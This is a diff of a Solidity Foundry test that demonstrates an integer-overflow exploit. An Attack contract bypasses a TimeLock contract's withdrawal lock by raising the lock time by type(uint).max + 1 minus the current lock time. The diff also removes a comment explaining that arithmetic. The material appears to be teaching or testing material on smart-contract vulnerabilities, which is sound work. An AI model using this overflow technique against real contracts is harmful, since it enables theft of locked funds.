@@ -34,7 +34,7 @@ function testOverflow() public {
     vm.stopPrank();
 
     vm.startPrank(bob); 
-    AttackerContract = new Attack(TimeLockContract);
+    AttackerContract = new Attack(TimeLockContract);  //exploit here
     AttackerContract.attack{value: 1 ether}();
     console.log("Bypassed timelock, AttackerContract of balance", address(AttackerContract).balance);
     vm.stopPrank();
@@ -82,13 +82,7 @@ contract Attack {
 
     function attack() public payable {
         timeLock.deposit{value: msg.value}();
-        /*
-        if t = current lock time then we need to find x such that
-        x + t = 2**256 = 0
-        so x = -t
-        2**256 = type(uint).max + 1
-        so x = type(uint).max + 1 - t
-        */
+ 
         timeLock.increaseLockTime(
             type(uint).max + 1 - timeLock.lockTime(address(this))
         );
